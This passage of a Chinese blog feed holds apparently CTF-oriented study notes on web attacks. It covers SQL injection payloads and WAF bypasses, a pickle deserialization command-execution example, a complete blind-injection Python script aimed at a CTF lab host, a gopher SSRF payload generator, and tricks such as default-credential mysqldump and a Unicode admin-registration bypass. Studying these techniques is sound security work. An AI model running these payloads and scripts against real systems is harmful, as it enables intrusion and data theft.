&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码首先将SQL语句除了<code>a-z``0-9</code>和几个有限的字符外的其他所有字符替换为空，然后对其进行匹配，如果能够匹配到类似<code>unionall</code>、<code>(select</code>这样的获取数据所要用到的代码，就拒绝执行</p><p>但是即便是这样也还可以绕过，比如同表注入就不需要用到子查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> test3<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> substr(test2,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>或者可以使用多语句的方式执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-variable">@a</span>:<span class="hljs-operator">=</span><span class="hljs-number">0x73656c656374202a2066726f6d2074657374</span>;<br><span class="hljs-keyword">prepare</span> s <span class="hljs-keyword">from</span> <span class="hljs-variable">@a</span>;<br><span class="hljs-keyword">execute</span> s;<br></code></pre></td></tr></table></figure><p>也可以</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">handler <span class="hljs-keyword">user</span> <span class="hljs-keyword">open</span>;<br>handler <span class="hljs-keyword">user</span> read <span class="hljs-keyword">first</span>;<br></code></pre></td></tr></table></figure><h3 id="语义分析"><a href="#语义分析" class="headerlink" title="语义分析"></a>语义分析</h3><p>这是最高级的方式，模仿MySQL对SQL的分析，waf对用户的输入进行语法语义分析，如果符合MySQL的语法，就判断为SQL注入从而阻断</p><p>这种防护的绕过思路就是找特殊的语法，这些特殊语法waf可能没有覆盖全面，从而导致waf语义分析失败，从而进行绕过</p><p>例如我们上面说的MySQL8的tables和values语句就是比较新的语法，有很多waf还米有覆盖到</p>]]></content>
    
    
    <categories>
      
      <category>sql</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pickle反序列化</title>
    <link href="/blogs/python/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/blogs/python/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/news/7032">文章</a></p><p>pickle.dumps，pickle.loads相当于python的序列化和反序列化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tmp</span>():<br>        text = <span class="hljs-string">&quot;123&quot;</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>                <span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&quot;id&quot;</span>,)) <span class="hljs-comment"># return (os.system,(&quot;env;ls /;cat /flag&quot;,))</span><br>text = tmp()<br>serialized_text = pickle.dumps(text)<br><span class="hljs-built_in">print</span>(serialized_text)<br><br>reltext = pickle.loads(serialized_text)<br><span class="hljs-built_in">print</span>(reltext.text)<br></code></pre></td></tr></table></figure><p><strong>这里的__reduce__函数相当于php中的__wakeup</strong>, 参数1是函数，参数2是要传递给该函数的参数。<br>pickle在反序列化的时候会自动import未import的模块，直接执行。 这里的opcode是上述例子serialized_text</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br>pickle.loads(<span class="hljs-string">b&#x27;\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.&#x27;</span>)<br></code></pre></td></tr></table></figure><p>会自动执行命令。</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pickle,python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/blogs/uncategorized/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/blogs/uncategorized/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>sql包括：<br>mysql、sqlite、MongoDB、Access等等，语法各有不同，在注入时若出现500错误，可能需要换个语言</p><p>以下是mysql注入</p><p><a href="#%E6%B5%81%E7%A8%8B">流程</a><br><a href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5">无列名注入</a><br><a href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">时间盲注</a><br><a href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">报错注入</a></p><p><a href="https://xz.aliyun.com/t/13604?time__1311=GqmxuD9QiQdWqGNDQ0PBKqKoyfTaD#toc-9">各种注入方式</a><br><a href="https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#%E4%BD%BF%E7%94%A8%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87-1">各种绕过方式</a></p><h2 id="流程"><a href="#流程" class="headerlink" title="流程:"></a>流程:</h2><ol><li><p>判断闭合方式：<br>  a. 单引号 ‘<br>  b. 单引号加括号 ‘) (比如有in(USER_INPUT)语句)<br>  c. 数字型：输入1&#x2F;1，是否等于输入1</p></li><li><p>获取数据库名称:</p></li></ol><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span>;show databases;或者<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">database</span>()</span>;<br></code></pre></td></tr></table></figure><ol start="3"><li>获取表名</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select group_concat(table_name) from information_schema.tables where table_schema=database()<br>或者<br>1&#x27;;show tables from $DATABASE_NAME;<br></code></pre></td></tr></table></figure><ol start="2"><li>获取列名</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select group_concat(column_name) from information_schema.columns where table_schema=&#x27;&lt;&gt;&#x27; and table_name=&#x27;&lt;&gt;&#x27;<br>或者<br>1&#x27;;desc<br></code></pre></td></tr></table></figure><ol start="3"><li>获取数据</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select group_concat($column1,$column2) from $databaseName.$tableName<br></code></pre></td></tr></table></figure><p>如果需要查看文件内容，可以先看用户权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select user()<br></code></pre></td></tr></table></figure><p>如果是root用户,可以使用load_file函数,需要完整路径f</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select load_file(&quot;/var/www/html/flag.php&quot;)<br></code></pre></td></tr></table></figure><h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p>当information_schema被ban时候可以采用<code>mysql.innodb_table_stats</code>(还有两个)等库查到表名,接着使用无列名注入获取列名.然后获取数据</p><h3 id="join-using"><a href="#join-using" class="headerlink" title="join using"></a>join using</h3><p><strong>payload</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> TABLE_NAME <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> TABLE_NAME <span class="hljs-keyword">as</span> b) <span class="hljs-keyword">as</span> c<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> TABLE_NAME <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> TABLE_NAME <span class="hljs-keyword">as</span> b <span class="hljs-keyword">using</span>(COLUMN1_NAME)) <span class="hljs-keyword">as</span> c<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> TABLE_NAME <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> TABLE_NAME <span class="hljs-keyword">as</span> b <span class="hljs-keyword">using</span>(COLUMN1_NAME,COLUMN2_NAME)) <span class="hljs-keyword">as</span> c<br></code></pre></td></tr></table></figure><h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><p><strong>payload</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> a<span class="hljs-number">.2</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users) <span class="hljs-keyword">as</span> a<br></code></pre></td></tr></table></figure><h3 id="order-by-盲注"><a href="#order-by-盲注" class="headerlink" title="order by 盲注"></a>order by 盲注</h3><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>可能用到的函数有<br>mid, substr,</p><p>比如要猜测一个flag，共3个字符<br>对于第一个字符，遍历所有可能的取值，如果正确，则sleep，根据时间判断是否正确。</p><p>可以先判断如何闭合：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27; and select if(1=1,sleep(3),0);<br></code></pre></td></tr></table></figure><p>如3s后响应则正确闭合.</p><p>然后判断数据库名称:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27; and select if(ascii(substr(database(),1,1))=109,sleep(3),0);<br></code></pre></td></tr></table></figure><p>3s后响应则数据库的第一个字符是’m’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#时间盲注</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">from</span> requests.adapters <span class="hljs-keyword">import</span> HTTPAdapter<br><span class="hljs-keyword">from</span> urllib3.util.retry <span class="hljs-keyword">import</span> Retry<br><br><span class="hljs-comment"># 创建 Session 对象</span><br>session = requests.Session()<br><br><span class="hljs-comment"># 设置重试策略</span><br>retry_strategy = Retry(<br>    total=<span class="hljs-number">3</span>,  <span class="hljs-comment"># 最大重试次数</span><br>    backoff_factor=<span class="hljs-number">1</span>,  <span class="hljs-comment"># 重试等待时间：1, 2, 4, 8, ... 秒</span><br>    status_forcelist=[<span class="hljs-number">429</span>,<span class="hljs-number">500</span>, <span class="hljs-number">502</span>, <span class="hljs-number">503</span>, <span class="hljs-number">504</span>],  <span class="hljs-comment"># 需要重试的状态码</span><br>)<br><br><span class="hljs-comment"># 将重试策略应用到 Session 的 HTTPAdapter</span><br>adapter = HTTPAdapter(max_retries=retry_strategy)<br>session.mount(<span class="hljs-string">&quot;http://&quot;</span>, adapter)<br>session.mount(<span class="hljs-string">&quot;https://&quot;</span>, adapter)<br><br>db_name = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-comment">#geek</span><br>table_name = <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment"># F1naI1y,Flaaaaag</span><br>column_name = <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment"># id,fl4gawsl</span><br>base_url = <span class="hljs-string">&#x27;http://f8704f48-b61b-4370-97ec-2a5e2b4fe611.node5.buuoj.cn:81&#x27;</span><br><br>select = <span class="hljs-string">&#x27;select(group_concat(password))from(`F1naI1y`)&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_status</span>(<span class="hljs-params">response</span>):<br>    <span class="hljs-keyword">if</span>(response.status_code == <span class="hljs-number">429</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;too many requests&#x27;</span>)<br>        sleep(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">elif</span>(response.status_code != <span class="hljs-number">200</span>):<br>        <span class="hljs-built_in">print</span>(response.text)<br>        exit(-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_length</span>():<br>    <span class="hljs-keyword">global</span> base_url<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;start get_length&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;trying length : &quot;</span>, i)<br>        poc = <span class="hljs-string">f&quot;length((<span class="hljs-subst">&#123;select&#125;</span>))=<span class="hljs-subst">&#123;i&#125;</span>&quot;</span><br>        url = base_url + <span class="hljs-string">f&quot;/search.php?id=(<span class="hljs-subst">&#123;poc&#125;</span>)&quot;</span><br>        <span class="hljs-comment"># 发送请求</span><br>        <span class="hljs-keyword">try</span>:<br>            response = session.get(url=url)<br>            response.raise_for_status()  <span class="hljs-comment"># 检查请求是否成功</span><br>        <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求失败:&quot;</span>, e)<br>        i -= <span class="hljs-keyword">not</span> check_status(response)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;Click others&#x27;</span> <span class="hljs-keyword">in</span> response.text):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;true&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(i)<br>            <span class="hljs-keyword">return</span> i<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_data</span>(<span class="hljs-params">start,end</span>):<br>    <span class="hljs-keyword">global</span> base_url<br>    tmp = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start,end):<br>        mark = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>            poc = <span class="hljs-string">f&quot;ascii(substr((<span class="hljs-subst">&#123;select&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,<span class="hljs-subst">&#123;i&#125;</span>))=<span class="hljs-subst">&#123;j&#125;</span>&quot;</span><br>            url = base_url + <span class="hljs-string">f&quot;/search.php?id=(<span class="hljs-subst">&#123;poc&#125;</span>)&quot;</span><br>            <span class="hljs-comment"># 发送请求</span><br>            <span class="hljs-keyword">try</span>:<br>                response = session.get(url=url)<br>                response.raise_for_status()  <span class="hljs-comment"># 检查请求是否成功</span><br>            <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求失败:&quot;</span>, e)<br>            j -= <span class="hljs-keyword">not</span> check_status(response)<br>            <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;Click others&#x27;</span> <span class="hljs-keyword">in</span> response.text):<br>                tmp+=<span class="hljs-built_in">chr</span>(j)<br>                <span class="hljs-built_in">print</span>(tmp)<br>                mark = <span class="hljs-literal">True</span><br>            response.close()<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> mark):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;error occurred!!&#x27;</span>)<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-comment"># length = get_length()</span><br><br>begin = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">213</span>)):<br>    substr = <span class="hljs-string">f&quot;(substr((<span class="hljs-subst">&#123;select&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,4))&quot;</span><br>    poc = <span class="hljs-string">f&quot;not(locate(&#x27;flag&#x27;,<span class="hljs-subst">&#123;substr&#125;</span>))&quot;</span><br>    url = base_url + <span class="hljs-string">f&quot;/search.php?id=(<span class="hljs-subst">&#123;poc&#125;</span>)&quot;</span><br>    <span class="hljs-comment"># 发送请求</span><br>    <span class="hljs-keyword">try</span>:<br>        response = session.get(url=url)<br>        response.raise_for_status()  <span class="hljs-comment"># 检查请求是否成功</span><br>    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求失败:&quot;</span>, e)<br>    check_status(response)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;i : &quot;</span>, i)<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;ERROR&#x27;</span> <span class="hljs-keyword">in</span> response.text):<br>        begin = i<br>        <span class="hljs-keyword">break</span><br>flag = get_data(begin,<span class="hljs-number">214</span>)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>打印出报错信息的情况下可用</p><ol><li>updatexml(1,&lt;注入语句&gt;,1)</li><li>extractvalue(1,&lt;注入语句&gt;)</li></ol><p>例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #<br></code></pre></td></tr></table></figure><p>其中0x7e是让路径报错的关键, 且放在concat的第一个位置</p><p>报错最多32个字符,所以如果需要回显的字符数量超过32,则需要用到substr来分批次得到结果.<br>截取结果可用函数</p><ul><li>substr(str, pos [, length])</li><li>left</li><li>right</li><li>TRIM([{BOTH|LEADING|TRAILING} [substr] FROM] str)  </li><li>reverse(str)</li><li>insert(str, pos, end, replaced_str)  # 把从pos开始到end结束的字符串替换成replaced_str</li></ul><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><ol><li>过滤等号 —&gt; like</li><li>过滤空格 —&gt; 括号</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)))<br></code></pre></td></tr></table></figure><ol start="3"><li>过滤or —&gt; 用||，或者^（异或）</li><li>substr —&gt; right</li><li>过滤select<ol><li>用prepare</li></ol></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-1&#x27;;<br>set @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);<br>prepare stmt from @sql;<br>EXECUTE stmt;<br></code></pre></td></tr></table></figure><pre><code class="hljs"> 2. handler语句</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27;;<br>handler $TABLE_NAME open;<br>handler $TABLE_NAME read first;<br>...read next;<br></code></pre></td></tr></table></figure><pre><code class="hljs">3. 大小写绕过</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ssrf</title>
    <link href="/blogs/ssrf/ssrf/"/>
    <url>/blogs/ssrf/ssrf/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/articles/web/333318.html">文章</a></p><p><strong>利用一个可以发起网络请求的服务当作跳板来访问并攻击内部其他服务</strong></p><p>SNI inject <a href="https://www.youtube.com/watch?v=2MslLrPinm0">https://www.youtube.com/watch?v=2MslLrPinm0</a><br>TLS inject <a href="https://www.blackhat.com/us-20/briefings/schedule/#when-tls-hacks-you-19446">https://www.blackhat.com/us-20/briefings/schedule/#when-tls-hacks-you-19446</a> </p><p>或gpt问</p><ol><li>介绍TLS poison进行ssrf的方法</li><li>如何利用SNI injection实现ssrf</li></ol><p>可用点：<br><strong>协议</strong><br> file:&#x2F;&#x2F; 、gopher:&#x2F;&#x2F; 、dict 、http<br>1. 其中file协议用于访问内网文件,比如apache配置文件 &#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf，可以查看哪些端口是开放的, (其实访问的是file:&#x2F;&#x2F;localhost&#x2F;etc&#x2F;…)<br>2. gopher:&#x2F;&#x2F; 协议可以发送post数据，还可以进行反向shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>host = <span class="hljs-string">&quot;127.0.0.1:80&quot;</span><br>content = <span class="hljs-string">&quot;uname=admin&amp;passwd=admin&quot;</span><br>content_length = <span class="hljs-built_in">len</span>(content)<br>test =\<br><span class="hljs-string">&quot;&quot;&quot;POST /index.php HTTP/1.1</span><br><span class="hljs-string">Host: &#123;&#125;</span><br><span class="hljs-string">User-Agent: curl/7.43.0</span><br><span class="hljs-string">Accept: */*</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: &#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#123;&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(host,content_length,content)<br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = urllib.parse.quote(new)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gopher://&quot;</span>+host+<span class="hljs-string">&quot;/_&quot;</span>+result)<br></code></pre></td></tr></table></figure><p>本质上是</p><ol><li>先对请求进行url编码</li><li>把%0a替换成%0d%0a</li><li>对请求中进行url编码<br>burpsuite会对请求自动进行url解码一次，因此用burpsuite要比用python多编码一次。用python可以省去最后一步</li></ol><p>访问本地web服务时，默认使用80端口</p>]]></content>
    
    
    <categories>
      
      <category>ssrf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>tricks</title>
    <link href="/blogs/tricks/tricks/"/>
    <url>/blogs/tricks/tricks/</url>
    
    <content type="html"><![CDATA[<h2 id="参数名url"><a href="#参数名url" class="headerlink" title="参数名url"></a>参数名url</h2><p>http，file，gopher协议<br>文件路径（urllib.open允许通过路径打开文件）</p><h2 id="四字符rce"><a href="#四字符rce" class="headerlink" title="四字符rce"></a>四字符rce</h2><p><a href="https://xz.aliyun.com/news/1371">hitcon2017 wp</a></p><h2 id="mysqldump获取所有数据库所有数据"><a href="#mysqldump获取所有数据库所有数据" class="headerlink" title="mysqldump获取所有数据库所有数据"></a>mysqldump获取所有数据库所有数据</h2><p>（猜测账号密码为默认值）<br>mysqldump -u root -p root –all-databases</p><h2 id="ip伪造"><a href="#ip伪造" class="headerlink" title="ip伪造"></a>ip伪造</h2><p>出了X-Forwarded-For，还有client-ip</p><h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><p>‘ ı ‘, 不等于i，但是大写等于大写的I，这在注册时过滤admin后转大写时，可以起到注册admin的作用</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">```<span class="language-javascript">javascript</span><br><span class="language-javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-string">&#x27;A&#x27;</span>.<span class="hljs-title function_">charCodeAt</span>(); j &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>.<span class="hljs-title function_">charCodeAt</span>(); j++)&#123;</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> s = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCodePoint</span>(j);</span><br><span class="language-javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10FFFF</span>; i++) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> e = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCodePoint</span>(i);</span><br><span class="language-javascript"><span class="hljs-keyword">if</span> (s == e.<span class="hljs-title function_">toUpperCase</span>() &amp;&amp; s != e) &#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;char: &quot;</span>+e+<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="language-javascript">&#125;;</span><br><span class="language-javascript">&#125;;</span><br></code></pre></td></tr></table></figure><h2 id="url编码绕过"><a href="#url编码绕过" class="headerlink" 